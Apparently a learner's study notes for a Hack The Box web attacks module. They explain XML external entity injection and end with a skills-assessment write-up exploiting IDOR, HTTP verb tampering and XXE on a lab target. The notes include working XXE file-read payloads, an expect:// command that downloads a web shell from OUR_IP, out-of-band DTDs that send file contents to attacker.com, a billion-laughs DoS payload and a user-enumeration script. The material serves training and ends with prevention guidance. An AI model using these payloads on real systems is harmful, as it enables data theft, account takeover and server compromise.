## **XML External Entity (XXE) Injection(h4)**

### Intro to XML

**XML External Entity (XXE) Injection** is a critical vulnerability that occurs when an application parses XML input containing a reference to an external entity without proper validation. Listed as one of the **OWASP Top 10**, it can lead to sensitive data disclosure, server-side request forgery (SSRF), or even denial-of-service (DoS) attacks.

---

**1. Understanding XML Structure**

XML (Extensible Markup Language) is designed to store and transport data using a tree-like structure of elements.

- **Tags & Elements:** Data is wrapped in tags (e.g., `<sender>john@example.com</sender>`).
- **Declaration:** The first line defining the version and encoding (e.g., `<?xml version="1.0"?>`).
- **Entities:** These are essentially **variables** used to represent data or special characters (e.g., `&lt;` for `<`).

Here we see a basic example of an XML document representing an e-mail document structure:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<email>
  <date>01-01-2022</date>
  <time>10:00 am UTC</time>
  <sender>john@inlanefreight.com</sender>
  <recipients>
    <to>HR@inlanefreight.com</to>
    <cc>
        <to>billing@inlanefreight.com</to>
        <to>payslips@inlanefreight.com</to>
    </cc>
  </recipients>
  <body>
  Hello,
      Kindly share with me the invoice for the payment made on January 1, 2022.
  Regards,
  John
  </body>
</email>
```

The above example shows some of the key elements of an XML document, like:

| Key | Definition | Example |
| --- | --- | --- |
| `Tag` | The keys of an XML document, usually wrapped with (`<`/`>`) characters. | `<date>` |
| `Entity` | XML variables, usually wrapped with (`&`/`;`) characters. | `&lt;` |
| `Element` | The root element or any of its child elements, and its value is stored in between a start-tag and an end-tag. | `<date>01-01-2022</date>` |
| `Attribute` | Optional specifications for any element that are stored in the tags, which may be used by the XML parser. | `version="1.0"`/`encoding="UTF-8"` |
| `Declaration` | Usually the first line of an XML document, and defines the XML version and encoding to use when parsing it. | `<?xml version="1.0" encoding="UTF-8"?>` |

Furthermore, some characters are used as part of an XML document structure, like `<`, `>`, `&`, or `"`. So, if we need to use them in an XML document, we should replace them with their corresponding entity references (e.g. `&lt;`, `&gt;`, `&amp;`, `&quot;`). Finally, we can write comments in XML documents between `<!--` and `-->`, similar to HTML documents.

---

**2. Document Type Definition (DTD)**

A **DTD** defines the "legal" building blocks of an XML document, such as the allowed elements and their attributes.

- **Internal DTD:** Defined within the XML file itself.
- **External DTD:** Referenced via a file path or URL using the `SYSTEM` keyword.
    - Example: `<!DOCTYPE email SYSTEM "http://example.com/email.dtd">`

The following is an example DTD for the XML document we saw earlier:

```xml
<!DOCTYPE email [
  <!ELEMENT email (date, time, sender, recipients, body)>
  <!ELEMENT recipients (to, cc?)>
  <!ELEMENT cc (to*)>
  <!ELEMENT date (#PCDATA)>
  <!ELEMENT time (#PCDATA)>
  <!ELEMENT sender (#PCDATA)>
  <!ELEMENT to  (#PCDATA)>
  <!ELEMENT body (#PCDATA)>
]>
```

As we can see, the DTD is declaring the root `email` element with the `ELEMENT` type declaration and then denoting its child elements. After that, each of the child elements is also declared, where some of them also have child elements, while others may only contain raw data (as denoted by `PCDATA`).

---

**3. The Vulnerability: XML Entities**

The core of an XXE attack lies in how XML parsers handle **Custom Entities**.

- **Internal Entities**

You can define a variable inside a DTD and reference it later:
`<!ENTITY company "MyCorp">` — Calling `&company;` in the body will display "MyCorp".

- **External Entities (The Security Risk)**

Using the `SYSTEM` keyword, an entity can point to an **external resource**. If a web application parses user-controlled XML and allows external entities, an attacker can:

1. **Read Local Files:** Point the entity to sensitive files on the server (e.g., `file:///etc/passwd`).
2. **Internal Network Recon:** Use URLs to probe internal services (e.g., `http://localhost:8080`).

> **Note:** XXE occurs because many older or misconfigured XML parsers have external entity resolution enabled by default.
> 

---

### The difference between XML and DTD XML (Note)

In simple terms, an **XML Document Type Definition (DTD)** acts as a **blueprint** or a **rulebook** for an XML document.

While XML allows you to create your own tags (like `<pizza>` or `<employee>`), a DTD ensures that those tags are used consistently and correctly across different systems. Here are the primary use cases:

---

**1. Data Validation and Consistency**

The most common use of a DTD is to define the structure of the data. It ensures that an XML file follows a specific format before it is processed. For example, if you are building an ordering system, a DTD can mandate that:

- Every `<order>` **must** have a `<customerID>`.
- An `<order>` **cannot** have more than one `<shippingAddress>`.
- The `<date>` element **must** be present.

Without a DTD, one person might send an XML file with `<user_name>` while another sends `<username>`, causing the receiving application to crash or fail to find the data.

---

1.  **Simplifying Data with Entities**

As mentioned in the previous text, DTDs allow the use of **Entities** (variables). This is highly useful for:

- **Refactoring:** If a long legal disclaimer or company name appears 50 times in a document, you can define it once in the DTD:
`<!ENTITY copyright "© 2026 Inlane Freight Global Logistics">`
- **Maintenance:** If the company name changes, you only update it in the DTD, and it updates everywhere the entity `&copyright;` is used.

### Local File Disclosure

When a web application trusts unfiltered XML data from user input, we may be able to reference an external XML DTD document and define new custom XML entities. Let us see how we can identify potential XXE vulnerabilities and exploit them to read sensitive files from the back-end server.

---

1. **Identify**

The first step in identifying potential XXE vulnerabilities is finding web pages that accept an XML user input

 ![ALT](/HTB/Web_Penetration_Tester/Web_Attacks/Images/h4_1.jpeg)

If we fill the contact form and click on `Send Data`, then intercept the HTTP request with Burp, we get the following request:

 ![ALT](/HTB/Web_Penetration_Tester/Web_Attacks/Images/h4_2.png)

As we can see, the form appears to be sending our data in an XML format to the web server, making this a potential XXE testing target. Suppose the web application uses outdated XML libraries, and it does not apply any filters or sanitization on our XML input. In that case, we may be able to exploit this XML form to read local files.

 ![ALT](/HTB/Web_Penetration_Tester/Web_Attacks/Images/h4_3.png)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [<!ENTITY test SYSTEM "file:///etc/passwd">]>
<root>
<name>test</name>
<tel>999732836</tel>
<email>&test;</email>
<message>testing for XML</message>
</root>
```

`<!DOCTYPE email [` ... `]>`This tells the parser, "I am defining rules for a document type called 'email'." Everything inside the square brackets `[ ]` is the custom logic you are injecting. 

We see that we did indeed get the content of the `/etc/passwd` file, `meaning that we have successfully exploited the XXE vulnerability to read local files`. This enables us to read the content of sensitive files, like configuration files that may contain passwords or other sensitive files like an `id_rsa` SSH key of a specific user, which may grant us access to the back-end server. We can refer to the [File Inclusion / Directory Traversal](https://academy.hackthebox.com/course/preview/file-inclusion) module to see what attacks can be carried out through local file disclosure.

- **Tip:** In certain Java web applications, we may also be able to specify a directory instead of a file, and we will get a directory listing instead, which can be useful for locating sensitive files.

---

1. Reading Source Code

Another benefit of local file disclosure is the ability to obtain the source code of the web application. This would allow us to perform a `Whitebox Penetration Test`to unveil more vulnerabilities in the web application, or at the very least reveal secret configurations like database passwords or API keys.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [<!ENTITY test SYSTEM "file:///index.php">]>
<root>
<name>test</name>
<tel>999732836</tel>
<email>&test;</email>
<message>testing for XML</message>
</root>
```

If we referred to the file like this it wont work, this is  because `the file we are referencing is not in a proper XML format, so it fails to be referenced as an external XML entity`. If a file contains some of XML's special characters (e.g. `<`/`>`/`&`),it would break the external entity reference and not be used for the reference. Furthermore, we cannot read any binary data, as it would also not conform to the XML format.

So, instead of using `file://` as our reference, we will use PHP's `php://filter/` wrapper. With this filter, we can specify the `convert.base64-encode` encoder as our filter, and then add an input resource (e.g. `resource=index.php`), as follows:

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

 ![ALT](/HTB/Web_Penetration_Tester/Web_Attacks/Images/h4_4.png)

Select the result and send it to the decoder tab to base64-decode. Or view the database

```php
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [<!ENTITY test SYSTEM "php://filter/convert.base64-encode/resource=connection.php">]>
<root>
<name>test</name>
<tel>999732836</tel>
<email>&test;</email>
<message>testing for XML</message>
</root>
```

---

1. **Remote Code Execution with XXE**

This section explores how to escalate an **XML External Entity (XXE)** vulnerability beyond simple file reading into **Remote Code Execution (RCE)**, **SSRF**, or **Denial of Service (DoS)**. 

**The PHP `expect://` Wrapper:** If the PHP `expect` module is enabled, you can execute commands directly.

- **Basic Execution:** Using `expect://id` will return the current user's ID.
- **Writing a Web Shell:** Because complex commands (like reverse shells) `often break XML syntax due to special characters` (`>`, `|`, `&`), the most reliable method is to use the XXE to "download" a persistent shell.
    1. Create a local PHP shell: `<?php system($_REQUEST["cmd"]);?>`.
    2. Host it via a Python web server. `python3 -m http.server 80`
    3. Use the XXE to trigger a `curl` command on the target server to download your shell.
        
        ```xml
        <?xml version="1.0"?>
        <!DOCTYPE email [
          <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
        ]>
        <root>
        <name></name>
        <tel></tel>
        <email>&company;</email>
        <message></message>
        </root>
        ```
        

> **Important Note:** In the XML payload, spaces are replaced with `$IFS` (Internal Field Separator) to ensure the XML remains valid while being parsed by the system shell.
> 

> **Note:** The `expect` module is not enabled/installed by default on modern PHP servers, so this attack may not always work. This is why XXE is usually used to disclose sensitive local files and source code, which may reveal additional vulnerabilities or ways to gain code execution.
> 

---

4. Server-Side Request Forgery (SSRF)

XXE is frequently used as a vehicle for SSRF. Since the server’s XML parser is making the request, it can reach internal resources that you cannot access from the outside.

- **Enumeration:** You can scan internal ports to find running services (like the database on 5432 we discussed).
- **Accessing Internal APIs:** You can hit internal-only endpoints or cloud metadata services to steal credentials.

payloads for xxe to ssrf

---

1. **Denial of Service (DoS)**

Commonly known as the **"Billion Laughs Attack"** or an **XML Bomb**, this method aims to crash the server by exhausting its memory.

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY a0 "DOS" >
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">        
  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">        
]>
<root>
<name></name>
<tel></tel>
<email>&a10;</email>
<message></message>
</root>
```

- **Mechanism:** It defines a small entity and then creates nested entities that reference it multiple times.
- **Exponential Growth:** By the time the parser reaches the 10th level of nesting, a tiny amount of XML data expands into gigabytes of text in the server's memory.

> **Note:** Most modern parsers (like those in Apache or Nginx) have built-in protections against entity expansion limits to prevent this specific attack.
> 

### **Advanced File Disclosure**

1. **Advanced Exfiltration with CDATA**

in the previous example we used php wrapper to encode PHP source files, such that they would not break the XML format when referenced. But what about other types of Web Applications? in that case we can utilize: **`CDATA`  tag**

**CDATA** stands for **Character Data**. It tells the XML parser: *"Everything inside these brackets is just plain text. Do not try to parse it as XML tags."*

- **Starts with:** `<![CDATA[`
- **Ends with:** `]]>`

By wrapping a file's content in CDATA, you can safely extract the raw source code of an application without the XML parser crashing because of the PHP tags

```xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">                            <!-- enternal entity -->
  <!ENTITY file SYSTEM "file:///var/www/html/index.php"> <!-- extranal entity -->
  <!ENTITY end "]]>">                                    <!-- enternal entity -->
  <!ENTITY joined "&begin;&file;&end;">
]>
<root>
<name>test</name>
<tel>999732836</tel>
<email>&joined;</email>
<message>testing for XML</message>
</root>
```

After that, if we reference the `&joined;` entity, it should contain our escaped data. However, `this will not work, since XML prevents joining internal and external entities`, so we will have to find a better way to do so.

To bypass this limitation, we can utilize `XML Parameter Entities`, a special type of entity that starts with a `%` character and **can only be used within the DTD**. What's unique about parameter entities is that if we reference them from an external source (e.g., our own server), **then all of them would be considered as external** and can be joined, as follows:

```xml
<!ENTITY joined "%begin;%file;%end;">
```

store the above line in your machine as `xxe.dtd` and start a simple http server then fetch the file from you machine

```bash
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///var/www/html/connection.php"> 
  <!ENTITY % end "]]>"> 
  <!ENTITY % xxe SYSTEM "http://10.10.16.155:8000/xxe.dtd">  
  %xxe;
]>
<root>
<name>test</name>
<tel>999732836</tel>
<email>&joined;</email>
<message>testing for XML</message>
</root>
```

This way, the `xxe.dtd` will be parsed by the target and join the external entities together. Result:

 ![ALT](/HTB/Web_Penetration_Tester/Web_Attacks/Images/h4_5.png)

- **Note:** In some modern web servers, we may not be able to read some files (like index.php), as the web server would be preventing a DOS attack caused by file/entity self-reference (i.e., XML 
entity reference loop), as mentioned in the previous section.

This trick can become very handy when the basic XXE method does not work or when dealing with other web development frameworks.

---

1. **Error Based XXE**

In the case where the web application does not write the output, but the web application displays runtime errors (e.g., PHP errors) and does not have proper exception handling for the XML input, then we can use this flaw to read the output of the XXE exploit this is called `Error-Based XXE`

Example: If we send a malformed XML, we will get a runtime error: 

 ![ALT](/HTB/Web_Penetration_Tester/Web_Attacks/Images/h4_6.png)

we can exploit this flow to exfiltrate file content by appending the file name with a non-existing entity that will cause the web application to throw an error. First, host a DTD file so the web server refers to it 

```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

next call our external DTD file then reference to the error entity as follow:  

```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/error.dtd">
  %remote;
  %error;
]>
```

result: 

 ![ALT](/HTB/Web_Penetration_Tester/Web_Attacks/Images/h4_7.png)

### Blind Data Exfiltration

 In this section, we will see how we can get the content of files in a completely blind situation, where we neither get the output of any of the XML entities nor do we get any PHP errors displayed.

---

1. **[Out-of-Band Data Exfiltration](https://hackviser.com/tactics/pentesting/web/xxe#blind-xxe-with-oob-data-exfiltration)** 

In our previous attacks, we utilized an `out-of-band` attack since we hosted the DTD file in our machine and made the web application connect to us (hence out-of-band). The difference is that  instead of having the web application output our `file` entity to a specific XML entity, **we will make the web application send a web request to our web server with the content of the file we are reading.**

First create a evil.dtd file and use a parameter entity for the content of the file we are reading while 
utilizing PHP filter to base64 encode it. Then, create another external parameter entity and reference it to our IP, and place the `file` parameter value as part of the URL being requested over HTTP, as follows:

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/index.php?content=%file;'>">
```

 When the XML tries to reference the external `oob` parameter from our machine, it will request `http://OUR_IP:8000/index.php?content=<base64-encode>` from our machine, to decode the base64 automatically, we can create a simple php script that will detect the request for `content` parameter and base64-decode as follow: 

```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

Second, initiate the xxe payload: Note we used `%` character for external entities and `&` for internal entity reference 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/evil.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

result: 

 ![ALT](/HTB/Web_Penetration_Tester/Web_Attacks/Images/h4_8.png)

- Note: General Entities (`&`) vs. Parameter Entities (`%`)
    
    To understand the `&`, we have to look at **where** the entity is being used:
    
    - **Parameter Entities (`%name;`):** These are **only** allowed to be used inside the DTD (the part between `<!DOCTYPE ... [ ]>`). They are used to build the "logic" of the attack.
    - **General Entities (`&name;`):** These are allowed to be used in the **XML Body** (between the `<root>` tags).
    
    **The Reason for `&content;`:**In your XML structure, you placed the entity inside the `<root>` tags:`<root>&content;</root>`If you had tried to put `%oob;` there, the XML parser would have thrown an error because `%` entities are strictly forbidden outside of the DTD. By defining `content` as a **General Entity** (which we did inside the `evil.dtd`), we can now "call" it in the body of the XML.
    

**Out-of-band XXE with DNS** 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
%dtd;
]>
<root></root>
```

**evil.dtd:**

```xml
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://%file;.attacker.com/'>">
%all;
%send;
```

---

1. **Automated OOB Exfiltration**

One such tool is [XXEinjector](https://github.com/enjoiz/XXEinjector). This tool supports most of the tricks we learned in this module, 
including basic XXE, CDATA source exfiltration, error-based XXE, and blind OOB XXE.

First we need to save the request file 

```xml
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.234.170
Content-Length: 173
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.234.170
Referer: http://10.129.234.170/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

The "`XXEINJECT`" is a point where DTD should be injected. 

```bash
$ ./../../Tools/XXEinjector/XXEinjector.rb --file=request.txt --path=/etc/hosts --oob=http --phpfilter --proxy=127.0.0.1:8080 --host=10.10.16.155 --httpport=8000        
Ignoring google-protobuf-4.31.1 because its extensions are not built. Try: gem pristine google-protobuf --version 4.31.1
Ignoring sass-embedded-1.89.2 because its extensions are not built. Try: gem pristine sass-embedded --version 1.89.2
XXEinjector by Jakub Pałaczyński

Enumeration options:
"y" - enumerate currect file (default)
"n" - skip currect file
"a" - enumerate all files in currect directory
"s" - skip all files in currect directory
"q" - quit

[-] Multiple instances of XML found. It may results in false-positives.
[+] Sending request with malicious XML.
[+] Responding with XML for: /etc/hosts
[+] Retrieved data:
127.0.0.1 localhost
127.0.1.1 academy_webattacks_xxe
```

By default it logs the result in the current directory in `Logs` folder

```bash
$ cat Logs/10.129.234.170/etc/hosts.log 
127.0.0.1 localhost
127.0.1.1 academy_webattacks_xxe

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
127.0.0.1 localhost
127.0.1.1 academy_webattacks_xxe

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

This is the payload sent by the tool:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE convert [ <!ENTITY % remote SYSTEM "http://10.10.16.155:8000/file.dtd">%remote;%int;%trick;]>
<!DOCTYPE convert [ <!ENTITY % remote SYSTEM "http://10.10.16.155:8000/file.dtd">%remote;%int;%trick;]>
```

### XXE Prevention

Preventing **XML External Entity (XXE)** vulnerabilities is unique because it relies more on **secure library configuration** than on manual input validation. Since XML is handled by pre-built parsers, the vulnerability usually exists because a library's default settings are insecure or outdated.

- **Note:** You can find a detailed report of all vulnerable XML libraries, with recommendations on updating them and using safe functions, in [OWASP's XXE Prevention Cheat Sheet.](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#php)

---

**1. Updating Outdated Components**

Most XXE vulnerabilities stem from using old XML libraries that have external entity loading enabled by default.

- **Library Maintenance:** Developers should avoid deprecated functions like PHP’s `libxml_disable_entity_loader`, which is officially discouraged as of PHP 8.0.0.
- **Beyond Code:** It isn't just the core code; you must also update **SOAP APIs**, **SVG processors**, and **PDF generators**, as these often parse XML under the hood.
- **Automation:** Modern IDEs (like VSCode) and package managers (like `npm`) provide real-time warnings when outdated or vulnerable components are detected.

**2. Secure XML Configurations**

If you must use XML, you should "harden" the parser by disabling features that are rarely necessary for business logic but essential for attackers:

- **DTD/Entity Disabling:** Completely disable custom Document Type Definitions (DTDs) and External Entity references.
- **Disable XInclude:** Turn off support for `XInclude`, which allows one XML document to include another.
- **Prevent Loops:** Disable Entity Reference Loops to prevent "Billion Laughs" Denial of Service (DoS) attacks.

**3. General Best Practices**

- **Exception Handling:** Disable the display of runtime errors. **Error-based XXE** relies on the server leaking file contents or logic through error messages.
- **Format Migration:** Where possible, move away from XML entirely. Many developers now prefer **JSON** or **YAML**, and swap **SOAP** APIs for **REST** to reduce the attack surface.
- **Defense in Depth:** Use a Web Application Firewall (WAF) as a secondary layer of protection, but never rely on it as the primary fix, as WAFs can often be bypassed with encoding tricks.

## **Web Attacks - Skills Assessment**

## Scenario

You are performing a web application penetration test for a software development company, and they task you with testing the latest build of their social networking web application. Try to utilize the various techniques you learned in this module to identify and exploit multiple vulnerabilities found in the web application.

first login with the given credentials and study the website function while letting Burp capture the requests 

 ![ALT](/HTB/Web_Penetration_Tester/Web_Attacks/Images/s1.png)

I noticed that when I logged in, the website request a user information from this endpoint

 ![ALT](/HTB/Web_Penetration_Tester/Web_Attacks/Images/s2.png)

### Testing for Information Disclosure via IDOR

I changed the user id from 74 to 75 to test for IDOR vulnerability, and the result was success 

 ![ALT](/HTB/Web_Penetration_Tester/Web_Attacks/Images/s3.png)

In the source code of the `profile.php` we can see that the application uses a client-side `$.cookie("uid")` to fetch profile data and by manipulating this ID in the API request, an attacker can view the private information of any user in the database.

```jsx
   <script>
        $(document).ready(function() {
            fetch(`/api.php/user/${$.cookie("uid")}`, {
                method: 'GET'
            }).then(function(response) {
                return response.json();
            }).then(function(json) {
                $("#full_name").html(json['full_name']);
                $("#company").html(json['company']);
            });
        });
```

### Testing for password reset via IDOR

In the password reset a uesr can change their password by typing their new password and click submit

 ![ALT](/HTB/Web_Penetration_Tester/Web_Attacks/Images/s4.png)

the request is sent along with two additional parameters:  

 ![ALT](/HTB/Web_Penetration_Tester/Web_Attacks/Images/s5.png)

The user ID and their token. First I tried changing only the `uid` but I got `Access Denied` error

 ![ALT](/HTB/Web_Penetration_Tester/Web_Attacks/Images/s6.png)

In the `settings.php` page, we can see the reset function: 

 ![ALT](/HTB/Web_Penetration_Tester/Web_Attacks/Images/s7.png)

this endpoint → `/api.php/token/<userid>`reveals password reset tokens for any user based on their ID. Lets reveal user id 1 token :

 ![ALT](/HTB/Web_Penetration_Tester/Web_Attacks/Images/s8.png)

However, even with the right token and uid we still got an error 

 ![ALT](/HTB/Web_Penetration_Tester/Web_Attacks/Images/s9.png)

but we I changed the request to `GET` method, it changed successfully: 

 ![ALT](/HTB/Web_Penetration_Tester/Web_Attacks/Images/s10.png)

This is because → **Password Reset via HTTP Method Confusion:** While the `POST` method for password resets was properly restricted (Access Denied), the application logic fails to apply the same security controls to the `GET` method.

now we can login to the userid `1` with the changed password and with his username we discovered earlier

 ![ALT](/HTB/Web_Penetration_Tester/Web_Attacks/Images/s11.png)

### Administrative User Enumeration

There was no clear indication of the user's role from the user's information 

```json

{"uid":"1","username":"s.applewhite","full_name":"Samanta Applewhite","company":"Daniel Inc"}
```

So I had to enumerate the users id and search for any sign of an admin keyword

```jsx
import requests
import re 

URL = "http://154.57.164.76:32463/api.php/user"

def extract_admin_user():
    # Extract admin user from the username field if any
    admin_pattern = re.compile(r'admin|staf|root|adm',re.IGNORECASE)

    for uid in range(1,100):
        url = f"{URL}/{uid}"
        header = {"Cookie": f"PHPSESSID=dcclus0752qivu103s8ro2b9dt; uid={uid}"}
        print(f"Testing ..{url}")

    
        req = requests.get(url, headers=header)
        data = req.text

        if admin_pattern.search(data):
            print(f"Potential Admin username found!: {data}")
        else: 
            continue
    

extract_admin_user()
```

result:

```jsx
Testing ..http://154.57.164.76:32463/api.php/user/52
Potential Admin username found!: {"uid":"52","username":"a.corrales","full_name":"Amor Corrales","company":"Administrator"}
Testing ..http://154.57.164.76:32463/api.php/user/53
```

Confirm if the user indeed has an admin privileges. Do the same thing we did previously, grep the token from `/api.php/token/52` 

```jsx
{"token":"e51a85fa-17ac-11ec-8e51-e78234eb7b0c"}
```

paste it into the reset page and change the request method  from POST to GET

 ![ALT](/HTB/Web_Penetration_Tester/Web_Attacks/Images/s12.png)

login witht the username `a.corrales` and the new password  

 ![ALT](/HTB/Web_Penetration_Tester/Web_Attacks/Images/s13.png)

Do you notice the changes? we got a new feature → `ADD EVENT` 

### Testing for XXE

This feature allows us to add events and send the request  in XML format

 ![ALT](/HTB/Web_Penetration_Tester/Web_Attacks/Images/s14.png)

 ![ALT](/HTB/Web_Penetration_Tester/Web_Attacks/Images/s15.png)

Test for XXE vulnerability using this simple payload:

```xml
<!DOCTYPE foo [<!ENTITY test SYSTEM "file:///etc/passwd">]>
            <root>
            <name>&test;</name>
            <details>tt</details>
            <date>0004-02-03</date>
            </root>
            
```

result in success: 

 ![ALT](/HTB/Web_Penetration_Tester/Web_Attacks/Images/s16.png)

We can read files using php filter wrapper:

```xml
<!DOCTYPE foo [<!ENTITY test SYSTEM "php://filter/convert.base64-encode/resource=/index.php">]>
            <root>
            <name>&test;</name>
```

### List of vulnerabilities found:

**1.Insecure Direct Object Reference (IDOR) - User Profiles**

The application uses a client-side `$.cookie("uid")` to fetch profile data. By manipulating this ID in the API request, an attacker can view the private information of any user in the database.

- **Endpoint:** `/api.php/user/{id}`
- **Impact:** Massive Information Disclosure (PII leak).
- **Root Cause:** The backend trusts the ID provided by the client without verifying if the authenticated session matches the requested ID.

---

**2. IDOR - Sensitive Token Leakage**

A secondary, more critical IDOR exists on the token endpoint. This endpoint reveals password reset tokens for any user based on their ID.

- **Endpoint:** `/api.php/token/{id}`
- **Impact:** Facilitates Account Takeover (ATO) by providing the necessary secret for password resets.

---

**3. Password Reset via HTTP Method Confusion**

While the `POST` method for password resets was properly restricted (Access Denied), the application logic fails to apply the same security controls to the `GET` method.

- **Vulnerability:** HTTP Verb Tampering.
- **Impact:** Full Account Takeover. An attacker can bypass "Access Denied" restrictions simply by switching the request method to `GET` while providing the stolen token.

---

**4. Administrative User Enumeration**

Using the profile IDOR, an attacker can script the enumeration of the entire user base. Even if a "Role" field is hidden, metadata in the `company` field (e.g., "Administrator") allows for the identification of high-value targets.

- **Target Identified:** `uid: 52` (`a.corrales`).
- **Technique:** Automated Regex-based scraping of API responses.

---

**5. XML External Entity (XXE) Injection**

The "Add Events" feature parses XML input without disabling external entity references. This is the most severe vulnerability in the list as it leads to **Local File Read**.

- **Injection Point:** Event Creation XML payload.
- **Impact:** * **File Disclosure:** Reading `/etc/passwd`.
    - **Source Code Theft:** Using the `php://filter` wrapper to extract `index.php` in Base64 format.
- **Exploit Example:** `<!DOCTYPE foo [<!ENTITY test SYSTEM "php://filter/convert.base64-encode/resource=/index.php">]>`